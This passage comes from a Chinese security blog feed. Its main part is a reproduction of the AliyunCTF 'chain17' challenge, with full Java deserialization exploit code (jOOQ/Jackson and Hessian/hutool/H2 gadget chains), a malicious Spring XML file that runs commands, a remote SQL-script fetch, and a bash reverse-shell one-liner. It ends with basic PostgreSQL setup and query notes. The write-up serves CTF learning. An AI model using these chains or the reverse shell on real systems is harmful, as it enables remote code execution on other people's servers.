<p>此外,我们查看server/lib/wls-wsat.war/WEB-INF/web.xml文件可以发现这些接口都可以对SOAP报文进行处理,都有漏洞<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405211302.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405211435.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/</a></li>
<li><a href="https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/">https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/</a></li>
<li><a href="https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/">https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>第二届AliyunCTF chain17复现</title>
    <url>/2024/04/06/%E7%AC%AC%E4%BA%8C%E5%B1%8AAliyunCTF%20chain17%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这题给了一个客户端client和一个服务端server<br>server端就一个jooq依赖,一个read路由的反序列化点<br>client端有hessian,hutool,h2依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian-lite<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.8.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.224<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>还有一个Bean类:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.aliyunctf.agent.other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.resource.ResourceUtil;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: Bean.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.data)).readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* loaded from: Bean$BeanInputStream.class */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">BeanInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">        <span class="keyword">static</span> List&lt;String&gt; blackList;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(List.of(<span class="string">&quot;org.h2.&quot;</span>, <span class="string">&quot;com.fasterxml.&quot;</span>));</span><br><span class="line">                blackList.addAll(Arrays.asList(ResourceUtil.readUtf8Str(<span class="string">&quot;blacklist.txt&quot;</span>).split(<span class="string">&quot;[\\n\\r]+&quot;</span>)).stream().filter(l -&gt; &#123;</span><br><span class="line">                    <span class="keyword">return</span> !l.startsWith(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">                &#125;).map(l -&gt; &#123;</span><br><span class="line">                    <span class="keyword">return</span> l.strip();</span><br><span class="line">                &#125;).toList());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">BeanInputStream</span><span class="params">(InputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            List&lt;String&gt; rules = blackList.stream().filter(l -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> desc.getName().startsWith(l);</span><br><span class="line">            &#125;).toList();</span><br><span class="line">            <span class="keyword">if</span> (rules.isEmpty()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;%s matches blacklist rules: %s&quot;</span>.formatted(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;desc.getName(), String.join(<span class="string">&quot;,&quot;</span>, rules)&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>里面的getObject可以二次反序列化,还有一个黑名单来匹配我们传入的数据<br>我们的目的是通过客户端h2 JDBC来SSRF打服务端/read路由执行命令</p>
<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EventListenerList.readObject -&gt; POJONode.toString -&gt; ConvertedVal.getValue -&gt; ClassPathXmlApplicationContext.&lt;init&gt;</span><br></pre></td></tr></table></figure>
<p>exp:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.core.io.FileUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.ReflectUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> org.jooq.DataType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JDK17 VM options:</span></span><br><span class="line"><span class="comment">// --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens java.desktop/javax.swing.event=ALL-UNNAMED</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        gen(<span class="string">&quot;http://localhost:8000/poc.xml&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">gen</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.jooq.impl.Dual&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">table</span> <span class="operator">=</span> constructor1.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.jooq.impl.TableDataType&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tableDataType</span> <span class="operator">=</span> constructor2.newInstance(table);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.jooq.impl.Val&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor3</span> <span class="operator">=</span> clazz3.getDeclaredConstructor(Object.class, DataType.class, <span class="type">boolean</span>.class);</span><br><span class="line">        constructor3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">val</span> <span class="operator">=</span> constructor3.newInstance(<span class="string">&quot;whatever&quot;</span>, tableDataType, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.jooq.impl.ConvertedVal&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor4</span> <span class="operator">=</span> clazz4.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">convertedVal</span> <span class="operator">=</span> constructor4.newInstance(val, tableDataType);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> url;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">type</span> <span class="operator">=</span> ClassPathXmlApplicationContext.class;</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(val, <span class="string">&quot;value&quot;</span>, value);</span><br><span class="line">        ReflectUtil.setFieldValue(tableDataType, <span class="string">&quot;uType&quot;</span>, type);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(<span class="string">&quot;C:\\Users\\30779\\Desktop\\共享\\chain17\\chain17\\agent\\agent\\BOOT-INF\\lib\\jackson-databind-2.15.3.jar&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(ctMethod);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(convertedVal);</span><br><span class="line"></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) ReflectUtil.getFieldValue(undoManager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        ReflectUtil.setFieldValue(eventListenerList, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = SerializeUtil.serialize(eventListenerList);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>这里的classPool.appendClassPath(…)是为了防止javassist的not found 报错</li>
<li>运行配置需要加VM options: <img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406181827.png" alt="image.png"><br>poc.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;evil&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;T(Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406182031.png" alt="image.png"></li>
</ul>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p>官方wp,链子是:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSONObject.put -&gt; AtomicReference.toString -&gt; POJONode.toString -&gt; Bean.getObject -&gt; DSFactory.getDataSource -&gt; Driver.connect</span><br></pre></td></tr></table></figure><br>exp:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.core.map.SafeConcurrentHashMap;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.ReflectUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.db.ds.pooled.PooledDSFactory;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.setting.Setting;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.aliyunctf.agent.other.Bean;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicReference;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JDK17 VM options:</span></span><br><span class="line"><span class="comment">// --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        gen(<span class="string">&quot;runscript from &#x27;http://10.23.124.115:8000/localhost.sql&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">gen</span><span class="params">(String sql)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        hessian2Output.writeMapBegin(JSONObject.class.getName());</span><br><span class="line">        hessian2Output.writeObject(<span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> String.format(<span class="string">&quot;jdbc:h2:mem:test;init=%s&quot;</span>, sql);</span><br><span class="line"></span><br><span class="line">        <span class="type">Setting</span> <span class="variable">setting</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Setting</span>();</span><br><span class="line">        setting.put(<span class="string">&quot;url&quot;</span>, url);</span><br><span class="line">        setting.put(<span class="string">&quot;initialSize&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setting.setCharset(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) ReflectUtil.getFieldValue(<span class="literal">null</span>, ReflectUtil.getField(Unsafe.class, <span class="string">&quot;theUnsafe&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PooledDSFactory</span> <span class="variable">pooledDSFactory</span> <span class="operator">=</span> (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);</span><br><span class="line"></span><br><span class="line">        ReflectUtil.setFieldValue(pooledDSFactory, <span class="string">&quot;dataSourceName&quot;</span>, PooledDSFactory.DS_NAME);</span><br><span class="line">        ReflectUtil.setFieldValue(pooledDSFactory, <span class="string">&quot;setting&quot;</span>, setting);</span><br><span class="line">        ReflectUtil.setFieldValue(pooledDSFactory, <span class="string">&quot;dsMap&quot;</span>, <span class="keyword">new</span> <span class="title class_">SafeConcurrentHashMap</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        bean.setData(SerializeUtil.serialize(pooledDSFactory));</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(<span class="string">&quot;C:\\Users\\30779\\Desktop\\共享\\chain17\\chain17\\agent\\agent\\BOOT-INF\\lib\\jackson-databind-2.15.3.jar&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(ctMethod);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(bean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicReference</span>&lt;&gt;(pojoNode);</span><br><span class="line"></span><br><span class="line">        hessian2Output.writeObject(object);</span><br><span class="line">        hessian2Output.writeMapEnd();</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(data));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Hessian反序列化Map的时候会调用Map.put<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406193533.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406193813.png" alt="image.png"><br>去调用AtomicReference.toString<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406193844.png" alt="image.png"><br>然后是POJONode.toString<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406193922.png" alt="image.png"><br>一直走,走到 Bean.getObject<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406194142.png" alt="image.png"><br>调到DSFactory.getDataSource<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406194321.png" alt="image.png"><br>命令改成反弹shell:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></p>
<p>成功反弹shell<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240406195913.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL总结</title>
    <url>/2024/04/09/PostgreSQL/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装:"></a>安装:</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>官网下载: <a href="https://www.postgresql.org/download/windows/">https://www.postgresql.org/download/windows/</a><br>设置一个管理员密码,需要记住</p>
<p>通过 psql 连接 PostgreSQL:<br>去bin目录,或者配个环境变量<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psql.exe –U postgres</span><br><span class="line">输入口令即可</span><br></pre></td></tr></table></figure></p>
<p>或者直接打开SQL Shell,前面默认最好输个口令<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240408221702.png" alt="image.png"></p>
<p>pgAdmin4直接打开也行<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240408164621.png" alt="image.png"></p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull postgres:12.3</span><br></pre></td></tr></table></figure>
<p>创建本地卷<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume create pgdata</span><br></pre></td></tr></table></figure></p>
<p>查看卷<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume inspect pgdata</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240408222202.png" alt="image.png"></p>
<p>启动容器<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name postgres12 -e POSTGRES_PASSWORD=123456 -p 5040:5040 -v pgdata:/var/lib/postgresql/data -d postgres:12.3</span><br></pre></td></tr></table></figure></p>
<p>-d指定镜像,-v指定卷映射<br>这个pgdata的数据我好奇放哪里了,因为我是Windows cmd开的,就去网上搜了一下,最终在<code>&quot;\\wsl$\docker-desktop-data\mnt\wslg\distro\data\docker\volumes\pgdata&quot;</code>找到了</p>
<p>进入容器:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker exec -it postgres12 /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>进入数据库<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psql</span><br></pre></td></tr></table></figure></p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><blockquote>
<p>默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p>
</blockquote>
<ul>
<li>PostgreSql大小写敏感,但是会把我们输入的命令转化为小写执行</li>
<li>MySQL中的limit 0,1在postgresql只能以limit 1 offset 0格式存在</li>
<li>单行注释<code>space--space</code>,<code>#</code>不可以用</li>
<li><code>::text</code>是将类型转换为text</li>
<li></li>
</ul>
<p>与MySQL中的database()作用相同，为当前数据库名<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">current_catalog / current_database()</span><br></pre></td></tr></table></figure></p>
<p>查当前用户名<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user / current_user / getpgusername()</span><br></pre></td></tr></table></figure></p>
<p>查询所有的数据库<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select datname from pg_database;</span><br></pre></td></tr></table></figure></p>
<p>查询所有的表:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select relname from pg_stat_user_tables;</span><br></pre></td></tr></table></figure></p>
<p>获取当前数据库所有schema(数据库模式)<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schemaname <span class="keyword">from</span> pg_tables;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>合并名字一样的</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> schemaname <span class="keyword">from</span> pg_tables;</span><br></pre></td></tr></table></figure></p>
<p>获取当前数据库模式<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">current_schema</span>;</span><br></pre></td></tr></table></figure></p>
